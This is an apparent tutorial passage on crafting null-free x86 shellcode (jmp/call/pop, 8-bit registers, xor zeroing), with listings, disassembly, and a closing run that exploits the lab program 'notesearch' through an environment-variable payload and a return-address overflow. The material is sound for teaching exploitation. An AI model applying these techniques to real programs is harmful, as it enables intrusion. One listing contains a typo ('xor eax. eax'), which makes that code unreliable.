Looking at the disassembly, it is obbious that the first null bytes come from the call instruction
__________________________________________________________________________________
reader@hacking:~/booksrc $ ndisasm -b32 helloworld1
                -*-*-*
00000000    E80F000000     call 0x14 
                -*-*-*

00000005    48             dec eax         
00000006    656C           gs insb         
00000008    6C             insb            
00000009    6F             outsd           
0000000A    2C20           sub al,0x20     
0000000C    776F           ja 0x7d         
0000000E    726C           jc 0x7c         
00000010    64210A         and [fs:edx],ecx
00000013    0D59B80400     or eax,0x4b859 
00000018    0000           add [eax],al 
0000001A    BB01000000     mov ebx,0x1 
0000001F    BA0F000000     mov edx,0xf 
00000024    CD80           int 0x80 
00000026    B801000000     mov eax,0x1 
0000002B    BB00000000     mov ebx,0x0 
00000030    CD80           int 0x80 
__________________________________________________________________________________

The instruction jumps exection forward by 19 (0x13) bytes, based on the first operand
The call instruction allows for much longer jump distances, which means that a small value like 19 will have to be padded with leading zeroes resulting in null bytes

One way around this problem takes advantage of two's complement
A small negative number will have its leading bits turned on, resulting in 0xff bytes
This means that, if we call using a negative value to move backward in execution, the machine code for that instruction won't have any null bytes
The following revision of the helloworld shellcode uses a standard implementation of this trick: Jump to the end of the shellcode to a call instruction which, in turn, will jump back to a pop instruciton at the beginning of the shellcode

helloworld2.s
__________________________________________________________________________________

BITS 32             ; Tell nasm this is 32-bit code

jmp short one       ; Jump down to a call at the end

two:
; ssize_t write(int fd, const void *buf, size_t count);
  pop ecx           ; Pop the return address (string ptr) into ecx
  mov eax, 4        ; Write syscall #
  mov ebx, 1        ; STDOUT file descriptor
  mov edx, 15       ; Length of the string
  int 0x80          ; Do syscall: write(1, string, 14)

; void _exit(int status);
  mov eax, 1        ; Exit syscall #
  mov ebx, 0        ; Status = 0
  int 0x80          ; Do syscall: exit(0)

one:
  call two   ; Call back upwards to avoid null bytes
  db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes
__________________________________________________________________________________

After assembling this new shellcode, disassembly shows that the call instruction (shown alone) is now free of null bytes
This solves the first and most difficult null-byte problem for this shellcode, but there are still many other null bytes (marked with symbols)

__________________________________________________________________________________
reader@hacking:~/booksrc $ nasm helloworld2.s

reader@hacking:~/booksrc $ ndisasm -b32 helloworld2
00000000  EB1E          jmp short 0x20 
00000002  59            pop ecx 

-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
00000003  B804000000    mov eax,0x4 
00000008  BB01000000    mov ebx,0x1 
0000000D  BA0F000000    mov edx,0xf 
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-

00000012  CD80          int 0x80 

-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
00000014  B801000000    mov eax,0x1 
00000019  BB00000000    mov ebx,0x0 
-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-

0000001E  CD80          int 0x80 


         00000020  E8DDFFFFFF    call 0x2 


00000025  48            dec eax 
00000026  656C          gs insb 
00000028  6C            insb 
00000029  6F            outsd 
0000002A  2C20          sub al,0x20 
0000002C  776F          ja 0x9d 
0000002E  726C          jc 0x9c 
00000030  64210A        and [fs:edx],ecx 
00000033  0D            db 0x0D 
__________________________________________________________________________________

These remaining null bytes can be eliminated with an understanding of register widths and addressing
Notice that the first jmp instruction is actually jmp short
This means execution can only jump a maximum of approximately 128 bytes in either direction
The normal jmp instruction, as well as the call instruction (which has no short version), allows for much longer jumps
The difference between assembled machine code for the 2 jump varieties is shown below:

__________________________________________________________________________________
EB 1E                    jmp short 0x20
__________________________________________________________________________________


__________________________________________________________________________________
E9 1E 00 00 00           jmp 0x23
__________________________________________________________________________________


The EAX, EBX, ECX, EDX, ESI, EDI, EBP and ESP registers are 32 bits in width
The E stands for extended, because these were originally 16-bit versions of the registers called AX, BX, CX, DX, SI, DI, BP and SP
These original 16-bit versions of the registers can still be used for accessing the first 16 bits of each corresponding 32-bit register
Furthermore, the individual bytes of the AX, BX, CX and DX registers can be accessed as 8-bit registers called AL, AH, BL, BH, CL, CH, DL and DH, where L stands for low byte and H for high byte
Naturally, assembly instructions using the smaller registers only need to specify operands up to the register's bit width
The 3 variants of mov instruction are shown below

____________________________________
 Machine Code        Assembly
____________________________________
B8 04 00 00 00       mov eax, 0x4
66 B8 04 00          mov ax, 0x4
B0 04                mov al, 0x4
____________________________________

Using the AL, BL, CL or DL register will put the correct least significant byte into the corresponding extended register without creating any null bytes in the machine code
However, the top 3 bytes of the register could still contain anything
This is especially true for shellcode, since it will be taking over another process
If we want the 32-bit register values to be correct, we need to zero out the entire register before the mov instructions-- but this, again, must be done without using null bytes
Here are some more simple assembly instructions for our arsenal
These first 2 are small isntructions that increment and decrement their operand by 1

__________________________________________________________________________
 Instruction         Description
__________________________________________________________________________
inc <target>         Increment the target operand by adding 1 to it

dec <target>         Decrement the target oprand by subtracting 1 from it
__________________________________________________________________________

The next few instructions, like the mov instruction, have 2 operands
They all do simple arithmetic and bitwise logical operations between the 2 operands, storing the result in the first operand

__________________________________________________________________________
 Instruction            Description
__________________________________________________________________________
add <dest>, <source>    Adds the source operand to the destination operand,
                        storing the result in the destination
__________________________________________________________________________

sub <dest>, <source>    Subtract the source operand from the destination 
                        operand, storing the result in the destination
__________________________________________________________________________

or <dest>, <source>     Perform a bitwise or logic operation, comparing 
                        each bit of one operand with the corresponding bit
                        of the other operand
                              1 or 0 = 1
                              1 or 1 = 1
                              0 or 1 = 1
                              0 or 0 = 0
                        If the source bit or the destination bit is on, or 
                        if both of them are on, the result bit is on;
                        otherwise, the result is off
                        The final result is stored in the destination 
                        operand
__________________________________________________________________________

and <dest>, <source>    Perform a bitwise and logic operation, comparing
                        each bit of one operand with the corresponding bit
                        of the other operand
                              1 or 0 = 0
                              1 or 1 = 1
                              0 or 1 = 0
                              0 or 0 = 0
                        The result bit is on only if both the source bit 
                        and the destination bit are on
                        The final result is stored in the destination
                        operand
__________________________________________________________________________

xor <dest>, <source>    Perform a bitwise exclusive or (xor) logical 
                        operation, comparing each bit of one operand with
                        the corresponding bit of the other operand
                              1 or 0 = 1
                              1 or 1 = 0
                              0 or 1 = 1
                              0 or 0 = 0
                        If the bits differ, the result bit is on; if the bits
                        are the same, the result bit is off
                        The final result is stored in the destination operand
__________________________________________________________________________


One method is to move an arbitrary 32-bit number into the register and then subtract that value from the register using the mov and sub instructions:

__________________________________________
B8 44 33 22 11          mov eax,0x11223344
2D 44 33 22 11          sub eax,0x11223344
__________________________________________

While this technique works, it takes 10 bytes to zero out a single register, making the assembled shellcode larger than necessary
Can you think of a way to optimize this technique?
The DWORD value specified in each instruction comprises 80 percent of the code
Subtracting any value from itself also produces 0 and doens't require any static data
This can be done with a single 2-byte instruction:

__________________________________________
29 C0                sub eax,eax
__________________________________________

Using the sub instruction will work fine when zeroing registers at the beginning of shellcode
This instruction will modify processor flags, which are used for branching, however
For that reason, there is a preferred 2-byte instruction that is used to zero registers in most shellcode
The xor instruction perform an exclusive or operation on the bits in a register
Since 1 xored with 1 results in a 0, and 0 xored with 0 results in a 0, any value xored with itself will result in 0
This is the same result as with any value subtracted from itself, but the xor instruction doesn't modify processor flags, so it's considered to be a cleaner method

__________________________________________
31 C0                xor eax,eax
__________________________________________

We can safely use the sub instruction to zero registers (if done at the beginning of the shellcode), but the xor instruction is most commonly used in shellcode in the wild
This next revision of the shellcode makes use of the smaller registers and the xor instruction to avoid null bytes
The inc and dec instructions have also been used when possible to make for even smaller shellcode

helloworld3.s
__________________________________________________________________________________
BITS 32             ; Tell nasm this is 32-bit code

jmp short one       ; Jump down to a call at the end

two:
; ssize_t write(int fd, const void *buf, size_t count);
  pop ecx           ; Pop the return address (string ptr) into ecx
  xor eax. eax      ; Zero out full 32 bits of eax register
  mov al, 4         ; Write syscall #4 to the low byte of eax
  xor ebx, ebx      ; Zero out ebx
  inc ebx           ; Increment ebx to 1, STDOUT file descriptor
  xor edx, edx
  mov dl, 15        ; Length of the string
  int 0x80          ; Do syscall: write(1, string, 14)

;void _exit(int status)
  mov al, 1         ; Exit syscall #1, the top 3 bytes are still zeroed
  dec ebx           ; Decrement ebx back to 0 for status = 0
  int 0x80          ; Do syscall: exit(0)

one:
  call two   ; Call back upwards to avoid null bytes
  db "Hello, world!", 0x0a, 0x0d  ; with newline and carriage return bytes
__________________________________________________________________________________

After assembling this shellcode, hexdump and grep are used to quickly check for null bytes
__________________________________________________________________________________
reader@hacking:~/booksrc $ nasm helloworld3.s

reader@hacking:~/booksrc $ hexdump -C helloworld3 | grep --color=auto 00
00000000  eb 13 59 31 c0 b0 04 31  db 43 31 d2 b2 0f cd 80 |..Y1...1.C1.....|
00000010  b0 01 4b cd 80 e8 e8 ff  ff ff 48 65 6c 6c 6f 2c |..K.......Hello,|
00000020  20 77 6f 72 6c 64 21 0a  0d                      | world!..|
00000029
__________________________________________________________________________________

Now this shellcode is usable, as it doesn't contain any null bytes
When used with an exploit, the notesearch program is coerced into greeting the world like a newbie
__________________________________________________________________________________
reader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld3)

reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9bc

reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\xbc\xf9\xff\xbf"x40')
[DEBUG] found a 33 byte note for user id 999
-------[ end of note data ]-------
Hello, world!
__________________________________________________________________________________